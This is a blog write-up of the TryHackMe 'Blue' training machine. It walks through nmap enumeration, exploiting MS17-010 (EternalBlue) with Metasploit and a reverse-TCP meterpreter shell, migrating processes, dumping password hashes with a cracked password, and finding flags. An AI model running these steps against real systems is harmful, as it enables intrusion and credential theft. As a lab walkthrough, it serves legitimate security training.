---
layout: post
title: Pentesting&#58; TryHackMe/Blue
---

## TryHackMe: Blue - Write-up

This is a very simple box that focuses on the EternalBlue exploit which targets vulnerable versions of SMB.

### Enumeration

##### Nmap
```
# Nmap 7.92 scan initiated Sun Aug 14 09:30:45 2022 as: nmap -sV -sC -T5 -A -Pn -p 1-1000 -oN alltcp.txt 10.10.213.97
Nmap scan report for 10.10.213.97
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-14T16:30:59
|_  start_date: 2022-08-14T16:25:34
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:03:5c:52:57:25 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-14T11:30:59-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 14 09:31:04 2022 -- 1 IP address (1 host up) scanned in 19.75 seconds
```

##### SMB
```
# Nmap 7.92 scan initiated Sun Aug 14 09:35:00 2022 as: nmap -Pn -sV -p 445 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args=unsafe=1 -oN tcp_445_smb_nmap.txt 10.10.213.97
Nmap scan report for 10.10.213.97
Host is up (0.16s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-14T11:35:07-05:00
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-print-text: false
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:03:5c:52:57:25 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb2-time: 
|   date: 2022-08-14T16:35:07
|_  start_date: 2022-08-14T16:25:34
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|_    2.1
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-mbenum: 
|   Master Browser
|     JON-PC  6.1  
|   Potential Browser
|     JON-PC  6.1  
|   Server service
|     JON-PC  6.1  
|   Windows NT/2000/XP/2003 server
|     JON-PC  6.1  
|   Workstation
|_    JON-PC  6.1  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 14 09:37:03 2022 -- 1 IP address (1 host up) scanned in 122.83 seconds
```

### Foothold

This box is vulnerable to ms17-010 (EternalBlue). Searchsploit yields a few options:
```
─$ searchsploit ms17-010
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalCham | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) ( | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execut | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SM | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote C | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remot | windows_x86-64/remote/41987.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

For this exploit, we can use Metasploit quite easily.
```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

Set rhost to the box ip and lhost to local ip and execute for a successful shell. Background the shell using CTRL + Z so we can upgrade the shell to a meterpreter shell. 

### Privilege Escalation

In the metasploit console, use this command:
```
use post/multi/manage/shell_to_meterpreter
```

Options show we need to provide an lhost and a session id. To get session id's, use:
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                        Connection
  --  ----  ----               -----------                        ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [  10.2.11.19:4444 -> 10.10.183.3:49
                               Version 6.1.7601] -----            171 (10.10.183.3)
```

Set sessions to 1 and lhost to local ip. Run the exploit. If successful, use the sessions command to find the session id of the meterpreter session and use the following command to foreground the session.
```
sessions -i {session id}
```

We have successfully escalated to SYSTEM:
```
meterpreter > getsystem
[-] Already running as SYSTEM
```

Use the ps command to view all running processes. Our goal is to find a process running as system and migrate to it using the migrate {process_id} command.
```
meterpreter > migrate 2904
[*] Migrating from 1104 to 2904...
[*] Migration completed successfully.
```

### Post Exploitation

Now that we have successfully elevated our privileges, we can search for the required flags. Using hashdump, we can get a list of hashed passwords available on the box.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Using an online hash identified (https://hashes.com/en/tools/hash_identifier), we can paste the hash and find that the password is in an NTLM format hash and is:
```
ffb43f0de35be4d9917ac0cc8ad57f8d - alqfna22 - Possible algorithms: NTLM
```

### Flags

First flag can be found in the root directory. The second flag can be found in the SAM (System Account Manager) config file located at C:/Windows/System32/config.  Meterpreter has a search function that allows you to search a filesystem for an indicated patters. In our case, we can use the following command to search for flag.txt files on the system. The third flag is found the C:\Users\Jon\Documents directory.
```
meterpreter > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 12:26:36 -0700
c:\Windows\System32\config\flag2.txt  34            2019-03-17 12:32:48 -0700
c:\flag1.txt                          24            2019-03-17 12:27:21 -0700
```

##### SAM File
The System Account Manager config file contains the hashed values of passwords for users on the system. When a user inputs a password, it is checked against the hash in this file for authentication.

```
└─$ msfconsole                                                             
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.2.11-dev                          ]
+ -- --=[ 2233 exploits - 1179 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again

msf6 > 
```

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > 
```

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github
                                             .com/rapid7/metasploit-framework/wiki/
                                             Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use f
                                             or authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specif
                                             ied username
   SMBUser                         no        (Optional) The username to authenticat
                                             e as
   VERIFY_ARCH    true             yes       Check if remote architecture matches e
                                             xploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
                                             get. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                        process, none)
   LHOST     192.168.1.250    yes       The listen address (an interface may be spe
                                        cified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.213.97
RHOSTS => 10.10.213.97
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.16.2
lhost => 10.10.16.2
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```

```
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > 
```

